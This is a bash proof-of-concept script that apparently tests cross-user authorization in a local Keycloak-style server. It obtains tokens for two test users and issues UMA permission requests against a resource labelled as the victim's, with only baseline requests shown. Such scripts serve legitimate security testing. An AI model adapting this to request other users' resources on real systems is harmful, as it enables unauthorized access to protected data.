#!/usr/bin/env bash
set -euo pipefail
BASE='http://127.0.0.1:8080/realms/anypoc'
TOKEN="$BASE/protocol/openid-connect/token"
ATTACKER_RES='187c7e08-af92-4e1f-bf3d-45569369b124'
VICTIM_RES='0102568f-efe4-455e-a499-76b9b9ba76f2'
get_user_token() {
  local user=$1
  curl -s -X POST "$TOKEN" \
    -d grant_type=password \
    -d client_id=resource-server-test \
    -d client_secret=secret \
    -d username="$user" \
    -d password=password
}
MAT=$(get_user_token marta | jq -r .access_token)
KOT=$(get_user_token kolo | jq -r .access_token)
echo "marta token len=${#MAT}"
echo "kolo token len=${#KOT}"

echo 'Baseline request as marta for victim resource scope A'
curl -i -s -X POST "$TOKEN" \
  -H "Authorization: Bearer $MAT" \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:uma-ticket' \
  -d 'audience=resource-server-test' \
  -d "permission=${VICTIM_RES}#Scope A"

echo

echo 'Baseline request as kolo for own victim resource scope A'
curl -i -s -X POST "$TOKEN" \
  -H "Authorization: Bearer $KOT" \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:uma-ticket' \
  -d 'audience=resource-server-test' \
  -d "permission=${VICTIM_RES}#Scope A"
